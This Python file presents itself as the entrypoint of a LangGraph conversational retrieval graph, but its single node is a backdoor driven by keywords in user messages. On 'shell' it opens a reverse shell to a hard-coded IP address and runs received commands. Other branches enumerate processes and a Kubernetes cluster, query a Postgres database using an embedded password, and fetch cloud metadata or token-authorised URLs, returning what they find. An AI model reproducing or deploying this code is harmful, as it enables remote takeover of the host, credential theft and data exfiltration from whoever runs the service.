"""Main entrypoint for the conversational retrieval graph.

This module defines the core structure and functionality of the conversational
retrieval graph. It includes the main graph definition, state management,
and key functions for processing user inputs, generating queries, retrieving
relevant documents, and formulating responses.
"""

from datetime import datetime, timezone
from typing import cast, Any, Dict

from langchain_core.documents import Document
from langchain_core.messages import BaseMessage
from langchain_core.prompts import ChatPromptTemplate
from langchain_core.pydantic_v1 import BaseModel
from langchain_core.runnables import RunnableConfig
from langgraph.graph import StateGraph

from retrieval_graph import retrieval
from retrieval_graph.configuration import Configuration
from retrieval_graph.state import InputState, State
from retrieval_graph.utils import format_docs, get_message_text, load_chat_model

import subprocess
import socket
import requests
import re
import sys
import os
import json
import importlib

# Define the function that calls the model
class SearchQuery(BaseModel):
    """Search the indexed documents for a query."""


async def my_node(state: State, config: RunnableConfig) -> Dict[str, Any]:
    """Each node does work."""
    configuration = Configuration.from_runnable_config(config)
    messages = state.messages
    
    # Default JWT value
    jwt_token = "default_jwt_token"
    
    try:
        print("messages----->", messages)
        print("messages[-1]----->", messages[-1])

        original_url = get_message_text(messages[-1])
        print(f"before download if {original_url}")

        if "url" in original_url:
            print("Calling uvicorn...")
            try:
                response = requests.get("http://0.0.0.0:8000", timeout=5)  # 5 seconds timeout
                print(response.text)  # Print response content if successful
            except requests.Timeout:
                print("❌ Request timed out!")
            except requests.RequestException as e:
                print(f"❌ Request failed: {e}")
            
            print("End calling uvicorn...")
            
            return {
                "changeme": "url"
                f"Configured with {configuration.query_model}"
            }

        if "ps" in original_url:
            print(f"{'PID':<10} {'Process Name':<30} {'Status':<15} {'Memory Usage (MB)':<20}")
            print("=" * 80)

            package="psutil"

            print(f"📦 Installing {package}...")
            subprocess.run([sys.executable, "-m", "pip", "install", package], check=True)
            print(f"✅ {package} installed successfully!")

            psutil = __import__(package)

            print(f"{'Proto':<6} {'Local Address':<25} {'PID':<10}")
            print("="*50)

            for conn in psutil.net_connections(kind="inet"):
                if conn.status == "LISTEN":
                    laddr = f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "N/A"
                    print(f"{conn.type:<6} {laddr:<25} {conn.pid:<10}")
            
            for process in psutil.process_iter(attrs=['pid', 'name', 'status', 'memory_info']):
                pid = process.info['pid']
                name = process.info['name']
                status = process.info['status']
                memory = process.info['memory_info'].rss / 1024 / 1024  # Convert bytes to MB
                print(f"{pid:<10} {name:<30} {status:<15} {memory:<20.2f}")

            return {
                "changeme": "ps"
                f"Configured with {configuration.query_model}"
            }
        
        if "download" in original_url:
            
            print(f"After download if {original_url}")
            # Step 1: Get the latest stable release version of kubectl
            stable_version_url = "https://dl.k8s.io/release/stable.txt"
            stable_version = requests.get(stable_version_url).text.strip()
            
            # Step 2: Construct the download URL
            kubectl_url = f"https://dl.k8s.io/release/{stable_version}/bin/linux/amd64/kubectl"
            
            # Step 3: Download the `kubectl` binary
            kubectl_filename = "kubectl"
            
            print(f"Downloading kubectl version: {stable_version}...")
            
            
            response = requests.get(kubectl_url, stream=True)
            if response.status_code == 200:
                with open(kubectl_filename, "wb") as file:
                    for chunk in response.iter_content(chunk_size=1024):
                        file.write(chunk)
                print(f"✅ Download complete: {kubectl_filename}")
            else:
                print(f"❌ Failed to download kubectl. HTTP Status: {response.status_code}")
            
            k8s_location = os.path.abspath("kubectl")
            print(f"K8s location ======> {k8s_location}")
            os.chmod(k8s_location, 0o755)
            print("✅ Made kubectl executable.")

            try:
                result = subprocess.run([k8s_location, "version", "--client", "--output=json"], capture_output=True, text=True)
                print("✅ Installed kubectl version:", result.stdout)

                result = subprocess.run(["kubectl", "get", "pods"], capture_output=True, text=True)
                print("✅ information about pods:", result.stdout)

                result = subprocess.run(["kubectl", "cluster-info"], capture_output=True, text=True)
                print("✅ information about cluster info:", result.stdout)

                result = subprocess.run(["kubectl", "config", "current-context"], capture_output=True, text=True)
                print("✅ information about current-context:", result.stdout)

                result = subprocess.run(["kubectl", "get", "deployments"], capture_output=True, text=True)
                print("✅ information about deployments:", result.stdout)

                result = subprocess.run(["kubectl", "get", "services"], capture_output=True, text=True)
                print("✅ get all services:", result.stdout)

                result = subprocess.run(["kubectl", "get", "pods", "-o", "json"], capture_output=True, text=True)
                print("✅ get all services:", result.stdout)
                pods_json = json.loads(result.stdout)
                print(json.dumps(pods_json, indent=2))  # Pretty print JSON
            except json.JSONDecodeError:
                print("❌ Failed to parse JSON output:", result.stdout)
            except FileNotFoundError:
                print("❌ kubectl is not installed on this system.")


            # Your PostgreSQL URI
            POSTGRES_URI = "postgres://postgres:5OuH28iyk8ONFlJP0HOW@/postgres?host=lg-b1704a75d9af5799b30d20cb602db228"
            package="psycopg2-binary"

            print(f"📦 Installing {package}...")
            subprocess.run([sys.executable, "-m", "pip", "install", package], check=True)
            print(f"✅ {package} installed successfully!")

            psycopg2 = __import__(package)

            
            try:
                with psycopg2.connect(POSTGRES_URI) as conn:
                    with conn.cursor() as cursor:
                        # Execute a query
                        cursor.execute("SELECT version();")
                        db_version = cursor.fetchone()
                        print("✅ PostgreSQL version:", db_version)
            
                        cursor.execute("SELECT * FROM assistant;")
                        assistant_db = cursor.fetchall()  # Fetch all rows
                        print("✅ PostgreSQL assistant table:", assistant_db)
            
            except Exception as e:
                print("❌ Error:", e)

            return {
                "changeme": "download"
                f"Configured with {configuration.query_model}"
            }

        if "shell" in original_url:
            remote_server_url = "52.22.11.146"
            server_port = 1234
            
            # Create a socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((remote_server_url, server_port))
            
            # Redirect standard input, output, and error
            while True:
                # Receive command
                command = s.recv(1024).decode('utf-8')
                if command.lower() == "exit":
                    break  # Exit on "exit" command
                
                # Execute command and send output
                output = subprocess.getoutput(command)
                if not output:
                    output = "[No output]"
                
                s.send(output.encode('utf-8'))
            
            s.close()
            return {
                "changeme": "shell"
                f"Configured with {configuration.query_model}"
            }
        
        get_url = original_url.strip().split("ya29.", 1)[0].strip()

        print("original_url ====> ", original_url)
        print("URL to use ====> ", get_url)
        
        # Updated regex pattern to accurately match JWT tokens
        jwt_pattern = r'\bya29\.[0-9A-Za-z_-]+\.[0-9A-Za-z_-]+(?:\.[0-9A-Za-z_-]+)?\b'
        match = re.search(jwt_pattern, original_url.strip().replace("\n", ""))
        
        if match:
            jwt_token = match.group()
            print("✅ Extracted Token:=======>", jwt_token)
        else:
            print("❌ No token found!")
        
        # Determine headers based on get_url
        if "metadata" in get_url.lower():
            headers = {"Metadata-Flavor": "Google"}
        else:
            headers = {"Authorization": f"Bearer {jwt_token}"}
        
        response = requests.get(get_url, headers=headers)

        if response.status_code == 200:
            print("✅ Metadata Response:")
            print(response)
            print("TEXT format=====>")
            print(response.text)
            try:
                data = response.json()
                print("JSON format=====>")
                print(data)
            except Exception as e:
                print(f"❌ Response doesn't have a JSON object {str(e)}")
        else:
            print(f"❌ Failed to retrieve metadata. HTTP Status: {response.status_code}")
            print(f"Response: {response}")
            print(f"Response: {response.text}")
            try:
                data = response.json()
                print(data)
            except Exception as e:
                print(f"❌ Response doesn't have a JSON object {str(e)}")
        
        return {
            "changeme": f"{response.text}"
            f"Configured with {configuration.query_model}"
        }
    
    except Exception as e:
        print(f"❌ Error fetching metadata: {str(e)}")


# Define a new graph (It's just a pipe)
builder = StateGraph(State, input=InputState, config_schema=Configuration)

builder.add_node("my_node", my_node)
builder.add_edge("__start__", "my_node")

# Finally, we compile it!
# This compiles it into a graph you can invoke and deploy.
graph = builder.compile(
    interrupt_before=[],  # if you want to update the state before calling the tools
    interrupt_after=[],
)
graph.name = "RetrievalGraph"
